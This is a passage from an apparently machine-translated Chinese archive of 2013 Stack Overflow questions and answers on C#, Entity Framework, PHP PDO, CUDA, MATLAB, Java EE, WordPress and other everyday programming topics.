    public CreateAndMigrateDatabaseInitializer(string connection)
    {
        Contract.Requires(!string.IsNullOrEmpty(connection), "connection");

        _configuration = new TConfiguration
        {
            TargetDatabase = new DbConnectionInfo(connection)
        };
    }
    void IDatabaseInitializer<TContext>.InitializeDatabase(TContext context)
    {
        var doseed = !context.Database.Exists();
        // && new DatabaseTableChecker().AnyModelTableExists(context);
        // check to see if to seed - we 'lack' the 'AnyModelTableExists'
        // ...could be copied/done otherwise if needed...

        var migrator = new DbMigrator(_configuration);
        // if (doseed || !context.Database.CompatibleWithModel(false))
        if (migrator.GetPendingMigrations().Any())
            migrator.Update();

        // move on with the 'CreateDatabaseIfNotExists' for the 'Seed'
        base.InitializeDatabase(context);
        if (doseed)
        {
            Seed(context);
            context.SaveChanges();
        }
    }
    protected override void Seed(TContext context)
    {
    }
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-22T23:29:42.497

> 总结一下，
> 
> ```
> 1) what is the correct use-case for the different techniques available ?
> 
> 2) what would be the ideal strategy so that the migrations work in all conditions 
> and when we move databases from one environment to another ? 
> ```

退后一步，问问自己何时希望 EF 进行初始化和迁移。在我的（企业）组织中，我们对如何迁移代码、数据和 DDL 有非常严格的规定，因此这些功能对我们没有任何价值。即使我们可以使用它们，我也会非常谨慎，直到我在不同环境中对该工具有相当多的经验。

那么，为什么要使用它呢？您正在开始一个新的绿地项目并使用代码优先。现在，这就是它有用的地方。您可以编写代码、编译、运行并让 EF 担心新的或缺失的字段、关系和表。稍后，您可以在您的开发服务器中对其进行形式化，然后永远删除初始化器和迁移器。

至于怎么设置？听起来您找到了一种可行的方法。我同意这似乎有点 hacky，但代码类似于我的初始设置。我正在使用 MVC.NET，所以我在 Global.asax.cs 中使用了以下内容：

```
 Database.SetInitializer(new DomainInitializer()); 
```

底线是我认为你的（2）是错误的问题。应该是“我真的要这样做吗？”。事实证明你可能会这样做，但我会首先考虑其他更传统的选择，特别是如果你在一家超过 10 人的公司中。

# c# - .BeginInvoke 是否总是需要 .EndInvoke 用于线程池线程？

> ID：15998934
> 
> 赞同：2
> 
> 时间：2013-04-14T12:13:32.283
> 
> 标签：c#, .net, threadpool

所以 C#/.NET 问题。使用 .BeginInvoke 某些方法异步调用时，我是否总是需要调用 .EndInvoke？我在某处读过它是强制性的，但问题是 .EndInvoke 会阻止执行吗？是否有某种通用解决方案？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-14T12:16:26.003

是的，你必须打电话`EndInvoke()`。

> 但问题是 .EndInvoke 会阻止执行吗？

当您从回调方法调用它时不是，这是正确的模式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T12:15:56.527

是的，这是强制性的，原因有两个：
1) 避免可能的资源泄漏
2) 捕获可能已抛出的任何异常

下面是示例代码：

```
public delegate void DelegateHelper2(..parameters...);
private void ff(..parameters...);{}
DelegateHelper2 myDelegate =  new DelegateHelper2(ff);
// invoke asynchronyously 
IAsyncResult result = myDelegate.BeginInvoke(..parameters..., CallBackEmpty, null);

....
private void CallBackEmpty(IAsyncResult iasync)
{
    if (iasync != null)
    {
        string typeName = "";
        try
        {
            System.Runtime.Remoting.Messaging.AsyncResult aresult =
                (System.Runtime.Remoting.Messaging.AsyncResult)iasync;
            object action1 = aresult.AsyncDelegate;
            Type actionType = action1.GetType();
            typeName = actionType.ToString();

            if (action1 != null)
            {
                //action1.EndInvoke(iasync);
                actionType.InvokeMember("EndInvoke",
                    System.Reflection.BindingFlags.InvokeMethod, null,
                    action1, new object[] { iasync });
            }
        }
        catch (Exception ex)
        {
            string msg = "CallBackEmpty; for type: " + typeName +
                " ;Exception: " + ex.ToString();
            Setup_TraceExceptions(msg);
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-14T13:27:16.627

因此，似乎人们对上面应用的技巧感到困惑。我会解释。这是您的常规解决方案，当使用 .BeginInvoke 生成线程并忘记它时：

```
private void ff(..parameters...);{}
DelegateHelper2 myDelegate =  new DelegateHelper2(ff);
// invoke asynchronyously 
IAsyncResult result = myDelegate.BeginInvoke(..parameters..., CallBack2, myDelegate);

private void CallBack2(IAsyncResult iasync)
{
    if (iasync != null)
    {
        try
        {
            DelegateHelper2 action1 = (DelegateHelper2)iasync.AsyncState;
            action1.EndInvoke(iasync);
        }
        catch (Exception ex)
        {
            //Trace exeption somehow 
        }
    }
} 
```

存在问题：
1）您需要单独传递callBack delgate和delgate本身
2）如果您经常使用这种模式（以这种方式产生线程），您需要为每个.BeginInvoke编写一个新的CallBack方法，因为它在里面您指的是特定的委托类型（DelegateHelper2）。（我在我的代码中可能有 8 个这样的调用，这将导致 8 个不同的回调方法等。）

上面的例子确实解决了这些问题，通过这种方式：
1）您只传递 CallBack 委托，action1 是从 IAsyncResult 获得的
2）只需要一个 CallBack 方法，因为它不依赖于委托类型（通过反射解决)

# sql - VS 2010 中的 SQL Server 数据库连接

> ID：15998935
> 
> 赞同：0
> 
> 时间：2013-04-14T12:13:35.007
> 
> 标签：sql, sql-server, visual-studio-2010

我已经在 VS 2010 中完成了我的 MVC 程序。在连接字符串中，我有以下内容

```
<add name="RacePaceDBContext" 
     connectionString="data source=XX.XXX.XX.XXX,1433;Initial Catalog=RacePaceDataNew;Persist Security Info=True;User ID=user;Password=password;MultipleActiveResultSets=True" 
     providerName="System.Data.SqlClient"/> 
```

它连接到在 Amazon AWS 上的 EC2 实例上运行的 SQL Server。

该程序运行良好，连接效果很好。该程序连接并创建/读取数据等。

但是，我不确定为什么当我在左侧的服务器资源管理器中尝试“连接到数据库”并填写相同的设置时，它只是无法连接。任何想法为什么这会有所不同？因为希望能够登录并查看我的表格、数据等，而无需登录 AWS。当我使用 MySQL Workbench 尝试连接时也是如此 - 它给了我一个错误，告诉我服务器不可访问。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T14:27:47.670

可能是防火墙问题，请确保您的客户端可以连接到 xx.xxx.xx.xxxx:1433。

您也可以参考：[https ://forums.aws.amazon.com/thread.jspa?messageID=435146](https://forums.aws.amazon.com/thread.jspa?messageID=435146)

希望这有帮助。

# c++ - & 在类型后的函数参数中

> ID：15998941
> 
> 赞同：0
> 
> 时间：2013-04-14T12:14:14.307
> 
> 标签：c++, function, parameters, reference

在一个类中，我们有这个：

```
friend Circle copy(const Circle &); 
```

我知道通常通过引用传递一些东西，你在变量名之前使用 &，但在这种情况下，没有变量名......这到底是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T12:16:41.150

那是友元函数的声明。一般来说，当你声明一个函数时，你不需要在它的参数列表中命名变量。大多数人通常都会给它们命名，但有时很明显，它们被省略了。它不会改变任何东西——声明中变量的名称只是文档——重要的是定义中的名称（并且在法律上可以与声明中的名称不同）。

至于 C++ 中的“朋友”是什么意思，我让你上网查一下。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T12:16:20.100

这是一个函数声明；你不需要那些参数名称，只需要它的定义。在其他地方，会有类似的东西

```
friend copy(const Circle& other) {
  // method implementation
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-14T12:20:36.147

在函数声明中不需要提及参数名称。

```
friend Circle copy(const Circle &); 
```

在函数定义中，参数名称是必需的

```
friend Circle copy(const Circle &rhs)
{
.....

} 
```

# cuda - 上三角矩阵

> ID：15998944
> 
> 赞同：0
> 
> 时间：2013-04-14T12:14:18.870
> 
> 标签：cuda

我想用 cuda 创建上三角矩阵

在上三角矩阵中，位于对角线下方的元素 ed 为零。此函数应将给定值分配给其他元素。

但下面的代码将所有值分配为 0 为什么？

```
__global__ void initUpperTrinagleGPU(int *devMatrix, int numR, int numC, int value) {
    int x = blockDim.x*blockIdx.x + threadIdx.x;
    int y = blockDim.y*blockIdx.y + threadIdx.y;

    int offset = y * numC + x;

    if(numC <= numR) {
        devMatrix[offset] = 0;
    }
    else
        devMatrix[offset] = value;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T12:28:23.210

这种情况是错误`if(numC <= numR)`的，如果列数少于或等于行数，则为真。

这可能有效，但它只是在我的脑海中，未经测试：

```
if(x >= y) {
    devMatrix[offset] = 0;
}
else {
    devMatrix[offset] = value;
} 
```

请注意，您应该将其包装到另一个条件中，例如：

```
if(y < numR && x < numC) { ... 
```

# matlab - 如何轻松创建此矩阵？

> ID：15998947
> 
> 赞同：1
> 
> 时间：2013-04-14T12:15:00.250
> 
> 标签：matlab, matrix

如何在[MATLAB](http://en.wikipedia.org/wiki/MATLAB)中轻松创建以下矩阵？

用 A (nxn)、B (nxp) 和 N 为正整数。

```
Gamma = [B         0         0         ...   0 ; 
         A*B       B         0         ...   0 ; 
         A^2*B     A*B       B         ...   0 ; 
         ...       ...       ...       ... ... ; 
         A^(N-1)*B A^(N-2)*B A^(N-3)*B ...   B]; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T12:36:25.670

怎么样

```
[g{1:N,1:N}] = deal( zeros(n,p) );
g{1,1} = B;
for ii = 2:N
    g( ii, 2:end ) = g( ii-1, 1:end-1 );
    g{ ii, 1 } = A * g{ ii-1, 1 };
end
Gamma = cell2mat( g ); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-14T12:20:51.623

这行得通，尽管它的效率不如预期的那么高。

```
n = size(A,1);
p = size(B,2);

N = 3;
Gamma = zeros(N*n, N*p);

for ii = 1:N
  for jj = 1:N
    if ii >= jj
      Gamma((ii-1)*n+1:ii*n,(jj-1)*p+1:jj*p) = A^(ii-jj) * B;
    end
  end
end 
```

**编辑：**这是一个更有效的版本，它执行最少的矩阵乘法。

```
n = size(A,1);
p = size(A,2);

N = 3;
Gamma = zeros(N*n, N*p);

# Pre-compute all the matrix multiplications we'll need.
memo = cell(1, N);
memo{1} = B;
for ii = 1:N-1
  memo{ii+1} = A * memo{ii};
end

for ii = 1:N
  for jj = 1:N
    if ii >= jj
      Gamma((ii-1)*n+1:ii*n,(jj-1)*p+1:jj*p) = memo{ii-jj+1};
    end
  end
end 
```

# php - 何时使用 PDO 常量 PDO::PARAM_STR？

> ID：15998948
> 
> 赞同：1
> 
> 时间：2013-04-14T12:15:01.227
> 
> 标签：php, mysql, pdo

什么时候使用 PDO 常数`PDO::PARAM_STR`？我知道，当它在 a 中使用时`select`，它会给你`x`一些字符。是否也用于`Inserts`？这是如何工作的？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-14T12:17:42.667

恐怕你不太明白这个常数的含义。

首先，它是独立于查询的。
其次，它不是为了给你“x 个字符”，而是告诉 PDO 如何处理绑定变量。

您可以对几乎每个绑定变量使用此常量，或者不要全部使用它：

```
$name = 'Joe';
$stm  = $pdo->prepare("SELECT id FROM table WHERE name=?");
$stm->execute(array($name));
$name = $stm->fetchColumn(); 
```

这种方式`PDO::PARAM_STR`将被静默使用。

参考：[http ://www.php.net/manual/en/pdostatement.bindparam.php](http://www.php.net/manual/en/pdostatement.bindparam.php)

# jakarta-ee - arquillian 在测试前创建数据库模式

> ID：15998951
> 
> 赞同：0
> 
> 时间：2013-04-14T12:15:24.563
> 
> 标签：jakarta-ee, testing, integration-testing, glassfish-3, jboss-arquillian

您好，我尝试在测试之前创建我的数据库方案，但它失败了：/这是我的脚本：

```
CREATE TABLE OFCONVERSATION
(
  CONVERSATIONID integer NOT NULL,
  ROOM character varying(1024),
  ISEXTERNAL smallint NOT NULL,
  STARTDATE bigint NOT NULL,
  LASTACTIVITY bigint NOT NULL,
  MESSAGECOUNT integer NOT NULL,
  CONSTRAINT OFCONVERSATION_PK PRIMARY KEY (CONVERSATIONID)
); 
```

当我尝试使用 squirell 和嵌入式 derby 运行该脚本时，它的工作原理。

1.  首先我尝试在类测试之前使用注释 @CreateSchema("scripts/import.sql") ：
2.  下次尝试使用@ApplyScriptBefore
3.  第二我尝试使用脚本：

> 属性名称="scriptsToExecuteBeforeTest" 脚本/import.sql 属性

但这一切都失败了...

```
Tests run: 2, Failures: 0, Errors: 2, Skipped: 0, Time elapsed: 9.816 sec <<< FAILURE!
getPairChat(com.test.ejb.im.service.impl.PairChatTest)  Time elapsed: 0.451 sec  <<< ERROR!
org.jboss.arquillian.persistence.dbunit.exception.DBUnitDataSetHandlingException: Unable to execute statement: CREATE TABLE OFCONVERSATION
(
CONVERSATIONID integer NOT NULL,
ROOM character varying(1024),
ISEXTERNAL smallint NOT NULL,
STARTDATE bigint NOT NULL,
LASTACTIVITY bigint NOT NULL,
MESSAGECOUNT integer NOT NULL,
CONSTRAINT OFCONVERSATION_PK PRIMARY KEY (CONVERSATIONID)
);
    at org.apache.derby.iapi.error.StandardException.newException(Unknown Source)
    at org.apache.derby.impl.sql.compile.ParserImpl.parseStatement(Unknown Source)
    at org.apache.derby.impl.sql.GenericStatement.prepMinion(Unknown Source)
    at org.apache.derby.impl.sql.GenericStatement.prepare(Unknown Source)
    at org.apache.derby.impl.sql.conn.GenericLanguageConnectionContext.prepareInternalStatement(Unknown Source)
    at org.apache.derby.impl.jdbc.EmbedStatement.execute(Unknown Source)
    at org.apache.derby.impl.jdbc.EmbedStatement.execute(Unknown Source 
```

这是我的 arquillian pom 导入：

```
 <dependency>
      <groupId>org.glassfish.main.extras</groupId>
      <artifactId>glassfish-embedded-all</artifactId>
      <version>${glassfish-embedded-all.version}</version>
      <type>jar</type>
      <scope>test</scope>
    </dependency>

    <dependency>
        <groupId>org.jboss.arquillian.junit</groupId>
        <artifactId>arquillian-junit-container</artifactId>
        <scope>test</scope>
    </dependency>  

    <dependency>
        <groupId>org.jboss.arquillian.container</groupId>
        <artifactId>arquillian-glassfish-embedded-3.1</artifactId>
        <version>1.0.0.CR3</version>
        <scope>test</scope>
    </dependency>

    <dependency>
        <groupId>org.jboss.arquillian.extension</groupId>
        <artifactId>arquillian-persistence-impl</artifactId>
        <version>1.0.0.Alpha6</version>
        <scope>test</scope>
    </dependency> 
```

和我的 test-persistence.xml：

```
 <persistence-unit name="test-ejb" transaction-type="JTA">
  <jta-data-source>test-ds</jta-data-source>
  <exclude-unlisted-classes>false</exclude-unlisted-classes>      
  <properties>
      <property name="eclipselink.target-database" value="DERBY"/>
      <property name="eclipselink.platform.class.name" value="org.eclipse.persistence.platform.database.DerbyPlatform"/>
       <!-- <property name="eclipselink.ddl-generation" value="drop-and-create-tables"/> --> 
      <property name="eclipselink.logging.level" value="ALL"/>
      <property name="eclipselink.jpa.uppercase-column-names" value="true" />
  </properties>
  </persistence-unit> 
```

和 glassfish-resources.xml：

```
<resources>
    <jdbc-connection-pool name="test-pool"
        res-type="javax.sql.DataSource" datasource-classname="org.apache.derby.jdbc.EmbeddedDataSource"
        ping="true">
        <property name="ConnectionAttributes" value="create=true" />
        <property name="DatabaseName" value="./target/derbydb" />
        <property name="Password" value="" />
        <property name="User" value="" />
    </jdbc-connection-pool>
    <jdbc-resource jndi-name="test-ds" pool-name="test-pool" />
</resources> 
```

那么那个 sql 脚本或我的配置有什么问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-20T08:27:42.597

如果你得到（或与你使用 Derby 类似的东西）：

```
Caused by: java.sql.SQLException: ORA-00911: invalid character 
```

在您的堆栈跟踪中进一步向下，那么您可能偶然发现了[Alpha6 中的一个损坏的功能](https://issues.jboss.org/browse/ARQ-1444)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-16T10:23:39.633

这将对您有所帮助，因为我删除了特殊字符（回车，换行......）

```
CREATE TABLE OFCONVERSATION(  CONVERSATIONID integer NOT NULL,  ROOM character varying(1024),  ISEXTERNAL smallint NOT NULL,  STARTDATE bigint NOT NULL,  LASTACTIVITY bigint NOT NULL,  MESSAGECOUNT integer NOT NULL,  CONSTRAINT OFCONVERSATION_PK PRIMARY KEY (CONVERSATIONID)) 
```

# java - 如何从云端获取当前登录的 gmail 用户？

> ID：15998952
> 
> 赞同：1
> 
> 时间：2013-04-14T12:15:40.913
> 
> 标签：java, google-app-engine, google-cloud-endpoints

我正在尝试获取登录的谷歌用户的当前电子邮件 ID。我尝试了类似以下的方法，它在开发模式下工作但在生产模式下不工作。

```
public class EndpointAPI {

@ApiMethod(httpMethod = HttpMethod.GET, path = "getuser")
public Container getLoggedInUser() {

    UserService userService = UserServiceFactory.getUserService();
    User guser = userService.getCurrentUser();

    Container container = new Container();
    container.user = "user not logged in";

    if (null != guser)
        container.user = guser.getEmail();

    return container;
}

public class Container {
    public String user;
}   
} 
```

我尝试查看文档（并尝试添加客户端 ID、范围等），但无法成功找到我需要做的事情。

如果有人可以发布一个简单的工作示例，将不胜感激。

问候， 沙迪亚

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-16T20:05:18.597

最简单的情况是，您应该为 Web 应用程序注册一个客户端 ID，并`User`在 API 调用的方法签名中请求一个对象。支持来自 JS 客户端请求的示例：

ids.java：

```
public class Ids {
  public static final String WEB_CLIENT_ID = "12345.apps.googleusercontent.com";
} 
```

MyEndpoint.java：

```
@Api(clientIds = {Ids.WEB_CLIENT_ID})
public class MyEndpoint {
  public getFoo(User user) throws OAuthRequestException {
    if (user != null) {
      // do something with user
    } else {
      throw new OAuthRequestException("Invalid user.");
    }
  }
} 
```

`user`将自动填充由传递给您的 API 的令牌所代表的当前用户，或者`null`在令牌无效或丢失的情况下。当没有有效的用户对象时，上面的示例会引发异常，但您也可以选择允许未经身份验证的访问。

查看[文档](https://developers.google.com/appengine/docs/java/endpoints/auth)了解更多信息。

# facebook - Facebook画布应用程序中的登录弹出窗口与灯箱

> ID：15998953
> 
> 赞同：1
> 
> 时间：2013-04-14T12:15:41.487
> 
> 标签：facebook, facebook-javascript-sdk, facebook-canvas

我有一个 Facebook 画布应用程序，它`FB.getAuthResponse()`首先调用，如有必要，`FB.login()`. JS SDK的文档清楚地指出`FB.login()`打开一个登录弹出窗口，当我直接点击画布URL时这是正确的。但是，当我在画布页面中以匿名用户身份执行相同操作时，会出现“未登录”灯箱并重定向到登录页面。

有没有办法统一这种行为（最好总是使用弹出窗口）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T15:48:47.013

事实证明，在使用 JS SDK 时可以显式指定登录窗口的“格式” -[`FB.login()`接受`display`](https://developers.facebook.com/docs/reference/javascript/FB.ui/)定义窗口显示模式的[参数。](https://developers.facebook.com/docs/reference/javascript/FB.ui/)

最终代码如下所示：

```
var authResponse = FB.getAuthResponse();
if (authResponse && authResponse.signedRequest) {
    addFieldsAndSubmit(authResponse.signedRequest);
} else {
    FB.login(function(response) {
        if (response && response.authResponse) {
            addFieldsAndSubmit(response.authResponse.signedRequest);
        }
    }, {scope:'email', display: 'popup'});
} 
```

# zend-framework2 - zend 2：在验证前编辑数据

> ID：15998956
> 
> 赞同：0
> 
> 时间：2013-04-14T12:16:17.457
> 
> 标签：zend-framework2

我正在使用 zend 框架 2，我需要在验证之前编辑表单中的数据。

使用此功能，我将从 post 方法中获取数据，但不知道如何编辑它，因为对象是受保护的类型

```
$request = $this->getRequest(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T12:23:43.983

`$data = $request->getPost();`

并用它做你想做的事......

那么你可以这样做：

`$form->setData($data);`

# git - .gitignore 用于 Lua 项目

> ID：15998960
> 
> 赞同：1
> 
> 时间：2013-04-14T12:16:34.113
> 
> 标签：git, lua, gitignore

我注意到 GitHub[没有](https://github.com/github/gitignore)用于 Lua 项目的 .gitignore 模板。

是否有任何特定的文件/文件扩展名应默认从 Lua 项目的源代码控制中排除？我对 Lua 构建/测试/部署周期的了解还不够，无法自己了解。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T12:20:40.053

Lua 实际上没有任何这样的文件。将其与编写您通常不想签入的 .pyc 和 .pyo 文件的 Python 进行对比；Lua 通常不生成这样的文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T12:25:16.673

`luac`，默认情况下，将其输出写入`luac.out`. 除此之外，它将取决于您用于其他输出的任何构建系统，例如 from `luadoc`.

# php - PHP PDO 更新准备好的语句

> ID：15998961
> 
> 赞同：2
> 
> 时间：2013-04-14T12:16:39.443
> 
> 标签：php, pdo

我正在尝试使用以下查询更新我的数据库：

```
$sth = "UPDATE rpacks SET rpacks_location VALUES (:location) WHERE rpacks_id = (:id)";
$q = $conn->prepare($sth);
$q->execute(array(':location'=>$location, ':id'=>$id)); 
```

**但我收到了这个错误**

`Fatal error: Uncaught exception 'PDOException' with message 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'VALUES ('test') WHERE rpacks_id = ('2')' at line 1' in`

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-14T12:24:40.223

您的查询中有错误，`update`因为您使用了`insert`查询语法。

这是正确的查询：

```
$sth = "UPDATE rpacks SET rpacks_location = :location WHERE rpacks_id = :id"; 
```

**参考：** [http ://dev.mysql.com/doc/refman/5.0/en/update.html](http://dev.mysql.com/doc/refman/5.0/en/update.html)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-14T12:20:47.760

改成：

`$sth = "UPDATE rpacks SET rpacks_location = :location WHERE rpacks_id = :id";`

# php - .htaccess 中的 php 指令？

> ID：15998964
> 
> 赞同：5
> 
> 时间：2013-04-14T12:16:47.523
> 
> 标签：php, apache, php-ini, phpinfo

我试图通过 .htaccess 对 php 进行一些更改，但都没有产生任何结果。例如：

`php_value memory_limit 256M`内不会激活。

尝试设置`SetEnv PHPRC /home/username/public_html/php.ini`或任何类似的咒语，例如`SetEnv PHPRC /home/username/some_path`，都不会在 phpinfo 中产生任何差异。我确实看到`_SERVER["PHPRC"]`确实设置了，但是没有像上面提到的那样覆盖任何值。

我的phpinfo如下： [https ://gist.github.com/ylluminate/08efd9a2844723631214](https://gist.github.com/ylluminate/08efd9a2844723631214)

我想知道我是否缺少一个 apache 模块，该模块不允许它按预期为自定义 php.ini 或 phprc 工作。此外，这是 VPS 上的 Apache 2.4.4 安装，我可以 100% 控制（Linode）并使用 WHM + cPanel。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-16T00:44:55.797

从 PHP 5.3 开始，您可以使用`.user.ini`文件，因为 PHP 设置为通过 CGI/FastCGI SAPI 运行。
[http://php.net/configuration.file.per-user](http://php.net/configuration.file.per-user)

它是 main 的简单扩展，`php.ini`并允许等效地指定选项：

```
memory_limit = 256M
upload_tmp_dir = /tmp 
```

通常您可以将其中之一放在`DOCUMENT_ROOT`. 但是每个目录都可能包含一个，因此每个脚本/文件夹的选项可能会有所不同。它是 Apaches/mod_php`.htaccess`设置指令的完全替代品。

# wordpress - 设置 Wordpress 评论内容长度

> ID：15998966
> 
> 赞同：1
> 
> 时间：2013-04-14T12:17:19.700
> 
> 标签：wordpress

大家好，有没有一种方法可以限制 Wordpress 中 comment_content 的长度。我正在创建页面最后 5 条评论的视图，但想限制长度。

这是我到目前为止的代码：

```
<?php $args = array ( 'post_id' => '225', 'number' => '5', 'orderby' => 'date', 'order' => 'DESC', 'comment_approved' => '1' );

     $comments = get_comments($args);
       foreach($comments as $comment) :
        echo('<div class="sidebarNewsTitle">'. $comment->comment_author . ' said : "' . strip_tags($comment->comment_content). '..."</div>');
       endforeach;
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-07-18T08:32:50.197

```
add_action( 'preprocess_comment', 'ct_minimum_comment_length', 8 );

function ct_minimum_comment_length( $commentdata ){
    $minlength = 20;//minimal length you want to limit the comment content
    preg_match_all( '/./u', trim( $commentdata['comment_content'] ), $maxlength );
    $maxlength = count( $maxlength[0] );
    if( $maxlength < $minlength ) {
        wp_die( sprintf(_('Come on buddy, say at least %s characters', 'ct'), $minlength ));
    }
    return $commentdata;
} 
```

参考： http: [//clonetemplates.com/codex/limit-minimal-length-comment-content-wordpress.html/](http://clonetemplates.com/codex/limit-minimal-length-comment-content-wordpress.html/) [http://codex.wordpress.org/Plugin_API/Filter_Reference/preprocess_comment](http://codex.wordpress.org/Plugin_API/Filter_Reference/preprocess_comment)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-25T12:26:50.970

有一个很酷的新插件，您可以使用它设置评论的最小和最大文本。您还可以编辑文本。它被称为“控制评论长度”

查看[http://greenitsolutions.at/control-comment-length-wordpress-plugin-by-greenitsolutions-at/](http://greenitsolutions.at/control-comment-length-wordpress-plugin-by-greenitsolutions-at/)或 wordpress.org

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-14T14:07:12.057

我想您可以尝试使用功能来限制评论的长度，`wp_trim_words()`该功能允许您为特定内容块设置字符/字数限制。

要了解有关此功能的更多信息，请查看[本文](http://thomasgriffinmedia.com/blog/2012/09/limit-content-length-in-wordpress-with-wp_trim_words/)。

但是最好让你的用户知道这个限制，所以使用[这个插件](http://wordpress.org/extend/plugins/gregs-comment-length-limiter/)可能是一个更好的选择。

使用此插件，您可以设置：

> 限制评论表单中留下的评论长度，为用户显示字符倒计时，并随着每次按键动态更新。

# java - 异常启动过滤器 struts2 无法加载配置。- 行动

> ID：15998967
> 
> 赞同：0
> 
> 时间：2013-04-14T12:17:26.307
> 
> 标签：java, spring, hibernate, maven, struts2

我是 maven 新手，我正在尝试使用 struts2、Hibernate 和 spring3 构建应用程序。

当我尝试在 tomcat 服务器上部署我的应用程序时，出现以下错误。

```
SEVERE: Exception starting filter struts2
Unable to load configuration. - action - file:/C:/Prashant/WorkSpace/.metadata/.plugins/org.eclipse.wst.server.core/tmp0/wtpwebapps/EmployeeManagementSystem/WEB-INF/classes/struts.xml:17:64
    at com.opensymphony.xwork2.config.ConfigurationManager.getConfiguration(ConfigurationManager.java:58)
    at org.apache.struts2.dispatcher.Dispatcher.init_PreloadConfiguration(Dispatcher.java:360)
    at org.apache.struts2.dispatcher.Dispatcher.init(Dispatcher.java:403)
    at org.apache.struts2.dispatcher.ng.InitOperations.initDispatcher(InitOperations.java:69)
    at org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter.init(StrutsPrepareAndExecuteFilter.java:48)
    at org.apache.catalina.core.ApplicationFilterConfig.initFilter(ApplicationFilterConfig.java:273)
    at org.apache.catalina.core.ApplicationFilterConfig.getFilter(ApplicationFilterConfig.java:254)
    at org.apache.catalina.core.ApplicationFilterConfig.setFilterDef(ApplicationFilterConfig.java:372)
    at org.apache.catalina.core.ApplicationFilterConfig.<init>(ApplicationFilterConfig.java:98)
    at org.apache.catalina.core.StandardContext.filterStart(StandardContext.java:4461)
    at org.apache.catalina.core.StandardContext$2.call(StandardContext.java:5133)
    at org.apache.catalina.core.StandardContext$2.call(StandardContext.java:5128)
    at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:303)
    at java.util.concurrent.FutureTask.run(FutureTask.java:138)
    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
    at java.lang.Thread.run(Thread.java:619)
Caused by: Action class [dispEmployeeAction] not found - action - file:/C:/Prashant/WorkSpace/.metadata/.plugins/org.eclipse.wst.server.core/tmp0/wtpwebapps/EmployeeManagementSystem/WEB-INF/classes/struts.xml:17:64
    at com.opensymphony.xwork2.config.providers.XmlConfigurationProvider.verifyAction(XmlConfigurationProvider.java:405)
    at com.opensymphony.xwork2.config.providers.XmlConfigurationProvider.addAction(XmlConfigurationProvider.java:355)
    at com.opensymphony.xwork2.config.providers.XmlConfigurationProvider.addPackage(XmlConfigurationProvider.java:460)
    at com.opensymphony.xwork2.config.providers.XmlConfigurationProvider.loadPackages(XmlConfigurationProvider.java:265)
    at org.apache.struts2.config.StrutsXmlConfigurationProvider.loadPackages(StrutsXmlConfigurationProvider.java:111)
    at com.opensymphony.xwork2.config.impl.DefaultConfiguration.reloadContainer(DefaultConfiguration.java:189)
    at com.opensymphony.xwork2.config.ConfigurationManager.getConfiguration(ConfigurationManager.java:55)
    ... 16 more
14 Apr, 2013 1:58:28 PM org.apache.catalina.core.StandardContext startInternal
SEVERE: Error filterStart
14 Apr, 2013 1:58:28 PM org.apache.catalina.core.StandardContext startInternal
SEVERE: Context [/EmployeeManagementSystem] startup failed due to previous errors
14 Apr, 2013 1:58:28 PM org.apache.catalina.core.ApplicationContext log
INFO: Closing Spring root WebApplicationContext 
```

此错误消息说未找到操作类 [dispEmployeeAction] - 操作 - 文件：/C:/Prashant/WorkSpace/.metadata/.plugins/org.eclipse.wst.server.core/tmp0/wtpwebapps/EmployeeManagementSystem/WEB-INF /classes/struts.xml:17:64 但在我的 struts.xml 中，我将此操作映射为如下。

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE struts PUBLIC
"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
"http://struts.apache.org/dtds/struts-2.0.dtd">
<struts>

    <constant name="struts.enable.DynamicMethodInvocation" value="flase"></constant>
    <constant name="struts.devMode" value="true"></constant>

    <package name="default" extends="struts-default">

        <interceptors>
            <interceptor name="myInterceptor" class="action.MyInterceptor"></interceptor>
        </interceptors>

        <!-- For Employee Action mapping -->
        <action name="dispEmployeeAction" class="dispEmployeeAction">
            <result name="success">/employee_add.jsp</result>
        </action>

        <action name="employeeAction" class="employeeAction">
            <result name="input">/employee_add.jsp</result>
            <result name="list">/employee_list.jsp</result>
        </action>

        <action name="dispEmployeeListAction" class="dispEmployeeListAction">
            <result name="success">/employee_list.jsp</result>
        </action>

        <action name="employeeListAction" class="employeeListAction">
            <result name="success">/employee_list.jsp</result>
            <result name="new">/employee_add.jsp</result>
        </action>

    </package>
</struts> 
```

并且 pom.xml 如下

```
